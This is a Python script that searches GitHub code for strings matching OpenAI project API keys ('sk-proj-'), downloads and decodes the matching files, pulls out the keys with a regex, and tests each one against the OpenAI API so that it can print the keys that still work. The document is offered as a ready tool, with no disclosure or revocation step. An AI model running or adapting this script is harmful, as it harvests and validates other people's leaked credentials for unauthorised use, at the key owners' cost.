
## Python script that will search for OpenAI API keys on GitHub repositories
# Imports
import requests
import base64
import time
import re

# Constants
GITHUB_API_KEY: str = "ghp_....."	# Your GitHub API key here
SEARCH_API_URL: str = "https://api.github.com/search/code"
TEXT_TO_SEARCH: str = "sk-proj-"
PAGES_TO_SEARCH: int = 1000
SLEEPING_TIME: float = 1.0
REGEX: str = r"sk-proj-[a-zA-Z0-9]+"

# Function to extract the API keys from the content
def extract_keys(content: str) -> list[str]:
	""" Extract the API keys from the content
	Args:
		content (str): Content of the page
	Returns:
		list[str]: List of API keys found
	"""
	return re.findall(REGEX, content)

# Main function
def main() -> None:
	i = 1
	headers: dict = {"Authorization": "Bearer " + GITHUB_API_KEY}
	all_keys: list[str] = []
	while i < PAGES_TO_SEARCH + 1:
		time.sleep(SLEEPING_TIME)	# Be nice to the GitHub servers

		# Get the page content: ?type=code&q=sk-proj-
		response = requests.get(
			SEARCH_API_URL,
			params = {
				"q": TEXT_TO_SEARCH,
				"page": i
			},
			headers = headers
		)
		if response.status_code != 200:
			print(f"Error while fetching the page {i}: {response.status_code}")
			if response.status_code in (403, 422):
				print(f"Error, exiting... (response: {response.json()})")
				break
			continue
		
		# Get all content from everything found
		to_extract: str = ""
		results: list[dict] = response.json()["items"]
		print(f"Results found on page {i}: {len(results)}")
		for result in results:
			# Get the content of the file
			file_url: str = result["url"]
			response = requests.get(file_url, headers = headers)
			json_response: dict = response.json()
			content: str = json_response.get("content", "")
			encoding: str = json_response.get("encoding", "")

			# Decode the content if needed
			if encoding == "base64":
				content = content.encode("utf-8")
				content = base64.b64decode(content).decode("utf-8")
			
			# Add the content to the string to extract
			to_extract += content
		
		# Extract the API keys
		keys: list[str] = extract_keys(to_extract)
		if len(keys) > 0:
			print(f"Found {len(keys)} candidate keys on page {i}")
			all_keys += keys
		else:
			print(f"No API keys found on page {i}")
		
		i += 1
	
	# Remove duplicates
	all_keys = list(set(all_keys))
	all_keys += []

	# Check the validity of the keys
	valid_keys: list[str] = []
	from openai import OpenAI
	for i, key in enumerate(all_keys):
		try:
			client: OpenAI = OpenAI(api_key = key)
			client.models.list()
			valid_keys.append(key)
			print(f"Valid key found: {key}")
		except Exception as e:
			pass
		if i%30 == 29:
			print(f"Checked {i}/{len(all_keys)} keys")
	
	# Print the valid keys
	print("Valid keys found:")
	print("\n".join(valid_keys))


# If the script is run directly
if __name__ == "__main__":
	main()

